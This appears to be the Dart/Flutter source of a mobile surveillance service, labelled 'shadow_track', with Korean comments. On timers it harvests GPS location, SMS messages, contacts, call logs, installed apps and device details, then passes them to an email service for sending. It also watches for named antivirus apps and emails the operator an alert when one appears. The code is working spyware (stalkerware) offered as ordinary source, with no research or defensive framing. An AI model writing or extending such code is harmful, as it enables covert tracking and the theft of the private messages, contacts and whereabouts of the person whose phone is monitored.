import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'email_service.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('shadow_track');

  // 서비스 상태
  static bool _isTracking = false;
  static bool get isTracking => _isTracking;

  // 타이머들
  static Timer? _locationTimer;
  static Timer? _dataCollectionTimer;
  static Timer? _smsCollectionTimer;
  static Timer? _contactsCollectionTimer;
  static Timer? _advancedMonitoringTimer;

  // 수집 간격 (분)
  static const Map<String, int> collectionIntervals = {
    'location': 5,      // 5분마다 위치
    'sms': 10,          // 10분마다 SMS
    'contacts': 30,     // 30분마다 연락처
    'advanced': 15,     // 15분마다 고급 기능
  };

  /// 서비스 초기화
  static Future<void> initialize() async {
    try {
      await _channel.invokeMethod('initialize');
      print('TrackingService initialized');
    } catch (e) {
      print('TrackingService initialization error: $e');
    }
  }

  /// 추적 시작
  static Future<void> startTracking() async {
    if (_isTracking) return;

    _isTracking = true;

    // 기본 데이터 수집 시작
    _startLocationTracking();
    _startDataCollection();
    _startSMSCollection();
    _startContactsCollection();
    _startAdvancedMonitoring();

    // 이메일 서비스 시작
    EmailService.startEmailService();

    await _logEvent('TRACKING_STARTED', 'All monitoring services activated');
    print('All tracking services started');
  }

  /// 추적 중지
  static Future<void> stopTracking() async {
    if (!_isTracking) return;

    _isTracking = false;

    // 모든 타이머 중지
    _locationTimer?.cancel();
    _dataCollectionTimer?.cancel();
    _smsCollectionTimer?.cancel();
    _contactsCollectionTimer?.cancel();
    _advancedMonitoringTimer?.cancel();

    // 이메일 서비스 중지
    EmailService.stopEmailService();

    await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated');
    print('All tracking services stopped');
  }

  /// 위치 추적 시작
  static void _startLocationTracking() {
    _locationTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['location']!),
            (timer) async {
          try {
            await _collectLocationData();
          } catch (e) {
            print('Location collection error: $e');
          }
        }
    );

    // 즉시 한 번 실행
    _collectLocationData();
  }

  /// 위치 데이터 수집
  static Future<void> _collectLocationData() async {
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'heading': position.heading,
        'speed': position.speed,
        'timestamp': DateTime.now().toIso8601String(),
        'formatted_time': DateTime.now().toString(),
      };

      await _saveDataToFile('location_data.json', locationData);
      print('Location data collected: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      await _logEvent('LOCATION_ERROR', 'Failed to get location: $e');
    }
  }

  /// 데이터 수집 시작
  static void _startDataCollection() {
    _dataCollectionTimer = Timer.periodic(
        Duration(minutes: 10),
            (timer) async {
          try {
            await _collectSystemData();
          } catch (e) {
            print('Data collection error: $e');
          }
        }
    );
  }

  /// 시스템 데이터 수집
  static Future<void> _collectSystemData() async {
    try {
      // 디바이스 정보
      final deviceInfo = await _channel.invokeMethod('getDeviceInfo');
      await _saveDataToFile('device_info.json', deviceInfo);

      // 네트워크 정보
      final networkType = await _channel.invokeMethod('getNetworkType');
      final networkData = {
        'network_type': networkType,
        'timestamp': DateTime.now().toIso8601String(),
      };
      await _saveDataToFile('network_info.json', networkData);

      // 배터리 정보
      final batteryLevel = await _channel.invokeMethod('getBatteryLevel');
      final batteryData = {
        'battery_level': batteryLevel,
        'timestamp': DateTime.now().toIso8601String(),
      };
      await _saveDataToFile('battery_info.json', batteryData);

      print('System data collected');
    } catch (e) {
      await _logEvent('DATA_COLLECTION_ERROR', 'System data collection failed: $e');
    }
  }

  /// SMS 수집 시작
  static void _startSMSCollection() {
    _smsCollectionTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['sms']!),
            (timer) async {
          try {
            await _collectSMSData();
          } catch (e) {
            print('SMS collection error: $e');
          }
        }
    );
  }

  /// SMS 데이터 수집
  static Future<void> _collectSMSData() async {
    try {
      final smsMessages = await _channel.invokeMethod('readSMS');
      if (smsMessages != null && smsMessages.isNotEmpty) {
        for (var sms in smsMessages) {
          await _saveDataToFile('sms_data.json', {
            ...sms,
            'collected_at': DateTime.now().toIso8601String(),
          });
        }
        print('SMS data collected: ${smsMessages.length} messages');
      }
    } catch (e) {
      await _logEvent('SMS_ERROR', 'SMS collection failed: $e');
    }
  }

  /// 연락처 수집 시작
  static void _startContactsCollection() {
    _contactsCollectionTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['contacts']!),
            (timer) async {
          try {
            await _collectContactsData();
          } catch (e) {
            print('Contacts collection error: $e');
          }
        }
    );
  }

  /// 연락처 데이터 수집
  static Future<void> _collectContactsData() async {
    try {
      final contacts = await _channel.invokeMethod('getContacts');
      if (contacts != null && contacts.isNotEmpty) {
        for (var contact in contacts) {
          await _saveDataToFile('contacts_data.json', {
            ...contact,
            'collected_at': DateTime.now().toIso8601String(),
          });
        }
        print('Contacts data collected: ${contacts.length} contacts');
      }
    } catch (e) {
      await _logEvent('CONTACTS_ERROR', 'Contacts collection failed: $e');
    }
  }

  /// 고급 모니터링 시작
  static void _startAdvancedMonitoring() {
    _advancedMonitoringTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['advanced']!),
            (timer) async {
          try {
            await _collectAdvancedData();
            await _checkEmergencyConditions();
          } catch (e) {
            print('Advanced monitoring error: $e');
          }
        }
    );
  }

  /// 고급 데이터 수집
  static Future<void> _collectAdvancedData() async {
    try {
      // 통화 기록
      final callLog = await _channel.invokeMethod('getCallLog');
      if (callLog != null && callLog.isNotEmpty) {
        for (var call in callLog) {
          await _saveDataToFile('call_log.json', {
            ...call,
            'collected_at': DateTime.now().toIso8601String(),
          });
        }
      }

      // 설치된 앱 목록
      final installedApps = await _channel.invokeMethod('getInstalledApps');
      if (installedApps != null) {
        await _saveDataToFile('installed_apps.json', {
          'apps': installedApps,
          'collected_at': DateTime.now().toIso8601String(),
        });
      }

      print('Advanced data collected');
    } catch (e) {
      await _logEvent('ADVANCED_ERROR', 'Advanced data collection failed: $e');
    }
  }

  /// 긴급 상황 감지
  static Future<void> _checkEmergencyConditions() async {
    try {
      // 안티바이러스 앱 설치 감지
      final installedApps = await _channel.invokeMethod('getInstalledApps');
      if (installedApps != null) {
        final antivirusApps = [
          'com.avast.android.mobilesecurity',
          'com.bitdefender.security',
          'com.eset.ems2.gp',
          'com.kaspersky.android.antivirus',
          'com.mcafee.vsm_android',
        ];

        for (var app in installedApps) {
          final packageName = app['packageName'] as String?;
          if (packageName != null && antivirusApps.contains(packageName)) {
            await EmailService.sendEmergencyData('Antivirus app detected: $packageName');
            await _logEvent('EMERGENCY_ANTIVIRUS', 'Antivirus detected: $packageName');
          }
        }
      }
    } catch (e) {
      await _logEvent('EMERGENCY_CHECK_ERROR', 'Emergency check failed: $e');
    }
  }

  /// 파일에 데이터 저장
  static Future<void> _saveDataToFile(String fileName, Map<String, dynamic> data) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      if (!await logsDir.exists()) {
        await logsDir.create(recursive: true);
      }

      final file = File('${logsDir.path}/$fileName');
      final jsonString = jsonEncode(data);
      await file.writeAsString('$jsonString\n', mode: FileMode.append);
    } catch (e) {
      print('File save error: $e');
    }
  }

  /// 이벤트 로깅
  static Future<void> _logEvent(String event, String details) async {
    final eventData = {
      'event': event,
      'details': details,
      'timestamp': DateTime.now().toIso8601String(),
      'service': 'TrackingService',
    };

    await _saveDataToFile('service_events.json', eventData);
  }

  /// 수집된 데이터 반환 (UI용)
  static Future<List<Map<String, dynamic>>> getCollectedData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (!await logsDir.exists()) {
        return [];
      }

      final allData = <Map<String, dynamic>>[];
      final files = await logsDir.list().toList();

      for (final file in files) {
        if (file is File && file.path.endsWith('.json')) {
          try {
            final content = await file.readAsString();
            final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

            for (final line in lines) {
              try {
                final data = jsonDecode(line) as Map<String, dynamic>;
                data['source_file'] = file.path.split('/').last;
                allData.add(data);
              } catch (e) {
                // JSON 파싱 오류 무시
              }
            }
          } catch (e) {
            // 파일 읽기 오류 무시
          }
        }
      }

      // 최신 순으로 정렬
      allData.sort((a, b) {
        final aTime = a['timestamp'] as String? ?? '';
        final bTime = b['timestamp'] as String? ?? '';
        return bTime.compareTo(aTime);
      });

      return allData;
    } catch (e) {
      print('Data retrieval error: $e');
      return [];
    }
  }

  /// 특정 타입 데이터 반환
  static Future<List<Map<String, dynamic>>> getSMSData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'sms_data.json' ||
        data.containsKey('address') ||
        data.containsKey('body')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getContactsData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'contacts_data.json' ||
        data.containsKey('contactName') ||
        data.containsKey('name')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getCallLogData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'call_log.json' ||
        data.containsKey('callType') ||
        data.containsKey('duration')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getLocationData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'location_data.json' ||
        data.containsKey('latitude')
    ).toList();
  }

  /// 통계 정보
  static Future<Map<String, dynamic>> getCollectionStats() async {
    try {
      final smsData = await getSMSData();
      final contactsData = await getContactsData();
      final callLogData = await getCallLogData();
      final locationData = await getLocationData();

      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      final stats = {
        'sms_count': smsData.length,
        'contacts_count': contactsData.length,
        'call_log_count': callLogData.length,
        'location_count': locationData.length,
        'total_log_files': 0,
        'total_data_files': 0,
        'last_update': DateTime.now().toIso8601String(),
      };

      if (await logsDir.exists()) {
        final files = await logsDir.list().toList();
        stats['total_log_files'] = files.length;
        stats['total_data_files'] = files.where((f) => f.path.endsWith('.json')).length;
      }

      return stats;
    } catch (e) {
      return {'error': 'Failed to get stats: $e'};
    }
  }

  /// 모든 데이터 삭제
  static Future<void> clearAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (await logsDir.exists()) {
        await logsDir.delete(recursive: true);
      }

      await _logEvent('DATA_CLEARED', 'All monitoring data cleared');
    } catch (e) {
      print('Clear data error: $e');
    }
  }

  /// 수동 데이터 전송
  static Future<bool> sendDataNow() async {
    return await EmailService.sendDataManually();
  }

  /// 이메일 서비스 상태
  static bool get isEmailServiceActive => EmailService.isActive;

  /// 다음 이메일 전송 시간
  static DateTime? get nextEmailSendTime => EmailService.nextSendTime;
}